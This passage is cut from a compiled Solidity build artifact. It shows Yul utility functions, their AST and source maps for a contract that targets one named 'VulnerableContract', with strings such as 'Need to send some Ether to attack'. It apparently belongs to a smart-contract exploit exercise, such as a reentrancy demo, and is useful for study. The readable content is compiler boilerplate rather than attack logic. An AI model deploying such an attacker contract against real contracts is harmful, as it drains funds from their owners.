                "src": "3837:4:2",
                "type": ""
              }
            ],
            "src": "3744:222:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "4068:73:2",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "4085:3:2"
                      },
                      {
                        "name": "length",
                        "nodeType": "YulIdentifier",
                        "src": "4090:6:2"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "4078:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "4078:19:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "4078:19:2"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "4106:29:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "4125:3:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "4130:4:2",
                        "type": "",
                        "value": "0x20"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "4121:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "4121:14:2"
                  },
                  "variableNames": [
                    {
                      "name": "updated_pos",
                      "nodeType": "YulIdentifier",
                      "src": "4106:11:2"
                    }
                  ]
                }
              ]
            },
            "name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "pos",
                "nodeType": "YulTypedName",
                "src": "4040:3:2",
                "type": ""
              },
              {
                "name": "length",
                "nodeType": "YulTypedName",
                "src": "4045:6:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "updated_pos",
                "nodeType": "YulTypedName",
                "src": "4056:11:2",
                "type": ""
              }
            ],
            "src": "3972:169:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "4191:261:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "4201:25:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "x",
                        "nodeType": "YulIdentifier",
                        "src": "4224:1:2"
                      }
                    ],
                    "functionName": {
                      "name": "cleanup_t_uint256",
                      "nodeType": "YulIdentifier",
                      "src": "4206:17:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "4206:20:2"
                  },
                  "variableNames": [
                    {
                      "name": "x",
                      "nodeType": "YulIdentifier",
                      "src": "4201:1:2"
                    }
                  ]
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "4235:25:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "y",
                        "nodeType": "YulIdentifier",
                        "src": "4258:1:2"
                      }
                    ],
                    "functionName": {
                      "name": "cleanup_t_uint256",
                      "nodeType": "YulIdentifier",
                      "src": "4240:17:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "4240:20:2"
                  },
                  "variableNames": [
                    {
                      "name": "y",
                      "nodeType": "YulIdentifier",
                      "src": "4235:1:2"
                    }
                  ]
                },
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "4398:22:2",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [],
                          "functionName": {
                            "name": "panic_error_0x11",
                            "nodeType": "YulIdentifier",
                            "src": "4400:16:2"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "4400:18:2"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "4400:18:2"
                      }
                    ]
                  },
                  "condition": {
                    "arguments": [
                      {
                        "name": "x",
                        "nodeType": "YulIdentifier",
                        "src": "4319:1:2"
                      },
                      {
                        "arguments": [
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "4326:66:2",
                            "type": "",
                            "value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
                          },
                          {
                            "name": "y",
                            "nodeType": "YulIdentifier",
                            "src": "4394:1:2"
                          }
                        ],
                        "functionName": {
                          "name": "sub",
                          "nodeType": "YulIdentifier",
                          "src": "4322:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "4322:74:2"
                      }
                    ],
                    "functionName": {
                      "name": "gt",
                      "nodeType": "YulIdentifier",
                      "src": "4316:2:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "4316:81:2"
                  },
                  "nodeType": "YulIf",
                  "src": "4313:2:2"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "4430:16:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "x",
                        "nodeType": "YulIdentifier",
                        "src": "4441:1:2"
                      },
                      {
                        "name": "y",
                        "nodeType": "YulIdentifier",
                        "src": "4444:1:2"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "4437:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "4437:9:2"
                  },
                  "variableNames": [
                    {
                      "name": "sum",
                      "nodeType": "YulIdentifier",
                      "src": "4430:3:2"
                    }
                  ]
                }
              ]
            },
            "name": "checked_add_t_uint256",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "x",
                "nodeType": "YulTypedName",
                "src": "4178:1:2",
                "type": ""
              },
              {
                "name": "y",
                "nodeType": "YulTypedName",
                "src": "4181:1:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "sum",
                "nodeType": "YulTypedName",
                "src": "4187:3:2",
                "type": ""
              }
            ],
            "src": "4147:305:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "4503:146:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "4513:25:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "x",
                        "nodeType": "YulIdentifier",
                        "src": "4536:1:2"
                      }
                    ],
                    "functionName": {
                      "name": "cleanup_t_uint256",
                      "nodeType": "YulIdentifier",
                      "src": "4518:17:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "4518:20:2"
                  },
                  "variableNames": [
                    {
                      "name": "x",
                      "nodeType": "YulIdentifier",
                      "src": "4513:1:2"
                    }
                  ]
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "4547:25:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "y",
                        "nodeType": "YulIdentifier",
                        "src": "4570:1:2"
                      }
                    ],
                    "functionName": {
                      "name": "cleanup_t_uint256",
                      "nodeType": "YulIdentifier",
                      "src": "4552:17:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "4552:20:2"
                  },
                  "variableNames": [
                    {
                      "name": "y",
                      "nodeType": "YulIdentifier",
                      "src": "4547:1:2"
                    }
                  ]
                },
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "4594:22:2",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [],
                          "functionName": {
                            "name": "panic_error_0x11",
                            "nodeType": "YulIdentifier",
                            "src": "4596:16:2"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "4596:18:2"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "4596:18:2"
                      }
                    ]
                  },
                  "condition": {
                    "arguments": [
                      {
                        "name": "x",
                        "nodeType": "YulIdentifier",
                        "src": "4588:1:2"
                      },
                      {
                        "name": "y",
                        "nodeType": "YulIdentifier",
                        "src": "4591:1:2"
                      }
                    ],
                    "functionName": {
                      "name": "lt",
                      "nodeType": "YulIdentifier",
                      "src": "4585:2:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "4585:8:2"
                  },
                  "nodeType": "YulIf",
                  "src": "4582:2:2"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "4626:17:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "x",
                        "nodeType": "YulIdentifier",
                        "src": "4638:1:2"
                      },
                      {
                        "name": "y",
                        "nodeType": "YulIdentifier",
                        "src": "4641:1:2"
                      }
                    ],
                    "functionName": {
                      "name": "sub",
                      "nodeType": "YulIdentifier",
                      "src": "4634:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "4634:9:2"
                  },
                  "variableNames": [
                    {
                      "name": "diff",
                      "nodeType": "YulIdentifier",
                      "src": "4626:4:2"
                    }
                  ]
                }
              ]
            },
            "name": "checked_sub_t_uint256",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "x",
                "nodeType": "YulTypedName",
                "src": "4489:1:2",
                "type": ""
              },
              {
                "name": "y",
                "nodeType": "YulTypedName",
                "src": "4492:1:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "diff",
                "nodeType": "YulTypedName",
                "src": "4498:4:2",
                "type": ""
              }
            ],
            "src": "4458:191:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "4700:51:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "4710:35:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "4739:5:2"
                      }
                    ],
                    "functionName": {
                      "name": "cleanup_t_uint160",
                      "nodeType": "YulIdentifier",
                      "src": "4721:17:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "4721:24:2"
                  },
                  "variableNames": [
                    {
                      "name": "cleaned",
                      "nodeType": "YulIdentifier",
                      "src": "4710:7:2"
                    }
                  ]
                }
              ]
            },
            "name": "cleanup_t_address",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "4682:5:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "cleaned",
                "nodeType": "YulTypedName",
                "src": "4692:7:2",
                "type": ""
              }
            ],
            "src": "4655:96:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "4802:81:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "4812:65:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "4827:5:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "4834:42:2",
                        "type": "",
                        "value": "0xffffffffffffffffffffffffffffffffffffffff"
                      }
                    ],
                    "functionName": {
                      "name": "and",
                      "nodeType": "YulIdentifier",
                      "src": "4823:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "4823:54:2"
                  },
                  "variableNames": [
                    {
                      "name": "cleaned",
                      "nodeType": "YulIdentifier",
                      "src": "4812:7:2"
                    }
                  ]
                }
              ]
            },
            "name": "cleanup_t_uint160",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "4784:5:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "cleaned",
                "nodeType": "YulTypedName",
                "src": "4794:7:2",
                "type": ""
              }
            ],
            "src": "4757:126:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "4934:32:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "4944:16:2",
                  "value": {
                    "name": "value",
                    "nodeType": "YulIdentifier",
                    "src": "4955:5:2"
                  },
                  "variableNames": [
                    {
                      "name": "cleaned",
                      "nodeType": "YulIdentifier",
                      "src": "4944:7:2"
                    }
                  ]
                }
              ]
            },
            "name": "cleanup_t_uint256",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "4916:5:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "cleaned",
                "nodeType": "YulTypedName",
                "src": "4926:7:2",
                "type": ""
              }
            ],
            "src": "4889:77:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "5066:92:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "5076:76:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "5146:5:2"
                      }
                    ],
                    "functionName": {
                      "name": "convert_t_contract$_VulnerableContract_$267_to_t_uint160",
                      "nodeType": "YulIdentifier",
                      "src": "5089:56:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "5089:63:2"
                  },
                  "variableNames": [
                    {
                      "name": "converted",
                      "nodeType": "YulIdentifier",
                      "src": "5076:9:2"
                    }
                  ]
                }
              ]
            },
            "name": "convert_t_contract$_VulnerableContract_$267_to_t_address_payable",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "5046:5:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "converted",
                "nodeType": "YulTypedName",
                "src": "5056:9:2",
                "type": ""
              }
            ],
            "src": "4972:186:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "5250:53:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "5260:37:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "5291:5:2"
                      }
                    ],
                    "functionName": {
                      "name": "cleanup_t_uint160",
                      "nodeType": "YulIdentifier",
                      "src": "5273:17:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "5273:24:2"
                  },
                  "variableNames": [
                    {
                      "name": "converted",
                      "nodeType": "YulIdentifier",
                      "src": "5260:9:2"
                    }
                  ]
                }
              ]
            },
            "name": "convert_t_contract$_VulnerableContract_$267_to_t_uint160",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "5230:5:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "converted",
                "nodeType": "YulTypedName",
                "src": "5240:9:2",
                "type": ""
              }
            ],
            "src": "5164:139:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "5337:152:2",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "5354:1:2",
                        "type": "",
                        "value": "0"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "5357:77:2",
                        "type": "",
                        "value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "5347:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "5347:88:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "5347:88:2"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "5451:1:2",
                        "type": "",
                        "value": "4"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "5454:4:2",
                        "type": "",
                        "value": "0x11"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "5444:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "5444:15:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "5444:15:2"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "5475:1:2",
                        "type": "",
                        "value": "0"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "5478:4:2",
                        "type": "",
                        "value": "0x24"
                      }
                    ],
                    "functionName": {
                      "name": "revert",
                      "nodeType": "YulIdentifier",
                      "src": "5468:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "5468:15:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "5468:15:2"
                }
              ]
            },
            "name": "panic_error_0x11",
            "nodeType": "YulFunctionDefinition",
            "src": "5309:180:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "5538:79:2",
              "statements": [
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "5595:16:2",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "5604:1:2",
                              "type": "",
                              "value": "0"
                            },
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "5607:1:2",
                              "type": "",
                              "value": "0"
                            }
                          ],
                          "functionName": {
                            "name": "revert",
                            "nodeType": "YulIdentifier",
                            "src": "5597:6:2"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "5597:12:2"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "5597:12:2"
                      }
                    ]
                  },
                  "condition": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "value",
                            "nodeType": "YulIdentifier",
                            "src": "5561:5:2"
                          },
                          {
                            "arguments": [
                              {
                                "name": "value",
                                "nodeType": "YulIdentifier",
                                "src": "5586:5:2"
                              }
                            ],
                            "functionName": {
                              "name": "cleanup_t_uint256",
                              "nodeType": "YulIdentifier",
                              "src": "5568:17:2"
                            },
                            "nodeType": "YulFunctionCall",
                            "src": "5568:24:2"
                          }
                        ],
                        "functionName": {
                          "name": "eq",
                          "nodeType": "YulIdentifier",
                          "src": "5558:2:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "5558:35:2"
                      }
                    ],
                    "functionName": {
                      "name": "iszero",
                      "nodeType": "YulIdentifier",
                      "src": "5551:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "5551:43:2"
                  },
                  "nodeType": "YulIf",
                  "src": "5548:2:2"
                }
              ]
            },
            "name": "validator_revert_t_uint256",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "5531:5:2",
                "type": ""
              }
            ],
            "src": "5495:122:2"
          }
        ]
      },
      "contents": "{\n\n    function abi_decode_t_uint256(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_uint256(value)\n    }\n\n    function abi_decode_tuple_t_uint256(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_t_contract$_VulnerableContract_$267_to_t_address_payable_fromStack(value, pos) {\n        mstore(pos, convert_t_contract$_VulnerableContract_$267_to_t_address_payable(value))\n    }\n\n    function abi_encode_t_stringliteral_5e9f184f94ce24cc63fc5ec28c25b2861cda6fa2c12f36c889d1b47ea3eab6ac_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 23)\n\n        mstore(add(pos, 0), \"Only owner can withdraw\")\n\n        end := add(pos, 32)\n    }\n\n    function abi_encode_t_stringliteral_e2f180be35e050acd5a54fbb046a37cbdb052195a20ac5086857b2816d309170_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 33)\n\n        mstore(add(pos, 0), \"Need to send some Ether to attac\")\n\n        mstore(add(pos, 32), \"k\")\n\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_stringliteral_f2fcfb1855a589b32b2878b73a2520b2bf7921f661dcf388dcc7453e4cee601f_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 36)\n\n        mstore(add(pos, 0), \"Target amount must be greater th\")\n\n        mstore(add(pos, 32), \"an 0\")\n\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_encode_tuple_t_contract$_VulnerableContract_$267__to_t_address_payable__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_contract$_VulnerableContract_$267_to_t_address_payable_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_5e9f184f94ce24cc63fc5ec28c25b2861cda6fa2c12f36c889d1b47ea3eab6ac__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_5e9f184f94ce24cc63fc5ec28c25b2861cda6fa2c12f36c889d1b47ea3eab6ac_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_e2f180be35e050acd5a54fbb046a37cbdb052195a20ac5086857b2816d309170__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_e2f180be35e050acd5a54fbb046a37cbdb052195a20ac5086857b2816d309170_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_f2fcfb1855a589b32b2878b73a2520b2bf7921f661dcf388dcc7453e4cee601f__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_f2fcfb1855a589b32b2878b73a2520b2bf7921f661dcf388dcc7453e4cee601f_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function checked_add_t_uint256(x, y) -> sum {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        // overflow, if x > (maxValue - y)\n        if gt(x, sub(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff, y)) { panic_error_0x11() }\n\n        sum := add(x, y)\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        if lt(x, y) { panic_error_0x11() }\n\n        diff := sub(x, y)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function convert_t_contract$_VulnerableContract_$267_to_t_address_payable(value) -> converted {\n        converted := convert_t_contract$_VulnerableContract_$267_to_t_uint160(value)\n    }\n\n    function convert_t_contract$_VulnerableContract_$267_to_t_uint160(value) -> converted {\n        converted := cleanup_t_uint160(value)\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function validator_revert_t_uint256(value) {\n        if iszero(eq(value, cleanup_t_uint256(value))) { revert(0, 0) }\n    }\n\n}\n",
      "id": 2,
      "language": "Yul",
      "name": "#utility.yul"
    }
  ],
  "sourceMap": "98:2365:0:-:0;;;411:13;;380:44;;465:147;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;556:18;524:10;;:51;;;;;;;;;;;;;;;;;;594:10;586:5;;:18;;;;;;;;;;;;;;;;;;465:147;98:2365;;7:159:2;;103:6;97:13;88:22;;119:41;154:5;119:41;:::i;:::-;78:88;;;;:::o;172:300::-;;299:2;287:9;278:7;274:23;270:32;267:2;;;315:1;312;305:12;267:2;358:1;383:72;447:7;438:6;427:9;423:22;383:72;:::i;:::-;373:82;;329:136;257:215;;;;:::o;478:104::-;;552:24;570:5;552:24;:::i;:::-;541:35;;531:51;;;:::o;588:126::-;;665:42;658:5;654:54;643:65;;633:81;;;:::o;720:138::-;801:32;827:5;801:32;:::i;:::-;794:5;791:43;781:2;;848:1;845;838:12;781:2;771:87;:::o;98:2365:0:-;;;;;;;",
  "deployedSourceMap": "98:2365:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;699:19;729:10;;;;;;;;;;;721:27;;;699:49;;847:12;;831:13;;:28;:76;;;;;896:11;863:29;;:44;;831:76;827:571;;;972:11;956:13;;:27;952:135;;;1020:11;1004:13;:27;;;;952:135;1168:13;;1151;;:30;;;;;;;:::i;:::-;;;;;;;;1229:13;;1196:29;;:46;;;;;;;:::i;:::-;;;;;;;;1275:1;1261:13;;:15;1257:92;;;1297:10;;;;;;;;;;:19;;;1317:13;;1297:34;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1257:92;827:571;661:744;98:2365;;;;;247:28;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;2135:165;;;;;;;;;;;;;:::i;:::-;;380:44;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;1471:626;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;309:44;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;166:20;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;193:27;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;2365:90;;;:::i;:::-;;123:36;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;247:28;;;;:::o;2135:165::-;2202:5;;;;;;;;;;;2188:19;;:10;:19;;;2180:55;;;;;;;;;;;;:::i;:::-;;;;;;;;;2254:5;;;;;;;;;;;2246:23;;:46;2270:21;2246:46;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2135:165::o;380:44::-;;;;:::o;1471:626::-;1558:1;1546:9;:13;1538:59;;;;;;;;;;;;:::i;:::-;;;;;;;;;1632:1;1616:13;:17;1608:66;;;;;;;;;;;;:::i;:::-;;;;;;;;;1700:13;1685:12;:28;;;;1740:9;1724:13;:25;;;;1830:10;;;;;;;;;;:18;;;1856:9;1830:38;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1921:10;;;;;;;;;;1913:27;;;1881:29;:59;;;;2014:10;;;;;;;;;;:19;;;2034:9;2014:30;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1471:626;:::o;309:44::-;;;;:::o;166:20::-;;;;;;;;;;;;;:::o;193:27::-;;;;:::o;2365:90::-;:::o;123:36::-;;;;;;;;;;;;:::o;7:139:2:-;;91:6;78:20;69:29;;107:33;134:5;107:33;:::i;:::-;59:87;;;;:::o;152:262::-;;260:2;248:9;239:7;235:23;231:32;228:2;;;276:1;273;266:12;228:2;319:1;344:53;389:7;380:6;369:9;365:22;344:53;:::i;:::-;334:63;;290:117;218:196;;;;:::o;420:118::-;507:24;525:5;507:24;:::i;:::-;502:3;495:37;485:53;;:::o;544:199::-;665:71;730:5;665:71;:::i;:::-;660:3;653:84;643:100;;:::o;749:321::-;;912:67;976:2;971:3;912:67;:::i;:::-;905:74;;1009:25;1005:1;1000:3;996:11;989:46;1061:2;1056:3;1052:12;1045:19;;895:175;;;:::o;1076:365::-;;1239:67;1303:2;1298:3;1239:67;:::i;:::-;1232:74;;1336:34;1332:1;1327:3;1323:11;1316:55;1402:3;1397:2;1392:3;1388:12;1381:25;1432:2;1427:3;1423:12;1416:19;;1222:219;;;:::o;1447:368::-;;1610:67;1674:2;1669:3;1610:67;:::i;:::-;1603:74;;1707:34;1703:1;1698:3;1694:11;1687:55;1773:6;1768:2;1763:3;1759:12;1752:28;1806:2;1801:3;1797:12;1790:19;;1593:222;;;:::o;1821:118::-;1908:24;1926:5;1908:24;:::i;:::-;1903:3;1896:37;1886:53;;:::o;1945:222::-;;2076:2;2065:9;2061:18;2053:26;;2089:71;2157:1;2146:9;2142:17;2133:6;2089:71;:::i;:::-;2043:124;;;;:::o;2173:290::-;;2338:2;2327:9;2323:18;2315:26;;2351:105;2453:1;2442:9;2438:17;2429:6;2351:105;:::i;:::-;2305:158;;;;:::o;2469:419::-;;2673:2;2662:9;2658:18;2650:26;;2722:9;2716:4;2712:20;2708:1;2697:9;2693:17;2686:47;2750:131;2876:4;2750:131;:::i;:::-;2742:139;;2640:248;;;:::o;2894:419::-;;3098:2;3087:9;3083:18;3075:26;;3147:9;3141:4;3137:20;3133:1;3122:9;3118:17;3111:47;3175:131;3301:4;3175:131;:::i;:::-;3167:139;;3065:248;;;:::o;3319:419::-;;3523:2;3512:9;3508:18;3500:26;;3572:9;3566:4;3562:20;3558:1;3547:9;3543:17;3536:47;3600:131;3726:4;3600:131;:::i;:::-;3592:139;;3490:248;;;:::o;3744:222::-;;3875:2;3864:9;3860:18;3852:26;;3888:71;3956:1;3945:9;3941:17;3932:6;3888:71;:::i;:::-;3842:124;;;;:::o;3972:169::-;;4090:6;4085:3;4078:19;4130:4;4125:3;4121:14;4106:29;;4068:73;;;;:::o;4147:305::-;;4206:20;4224:1;4206:20;:::i;:::-;4201:25;;4240:20;4258:1;4240:20;:::i;:::-;4235:25;;4394:1;4326:66;4322:74;4319:1;4316:81;4313:2;;;4400:18;;:::i;:::-;4313:2;4444:1;4441;4437:9;4430:16;;4191:261;;;;:::o;4458:191::-;;4518:20;4536:1;4518:20;:::i;:::-;4513:25;;4552:20;4570:1;4552:20;:::i;:::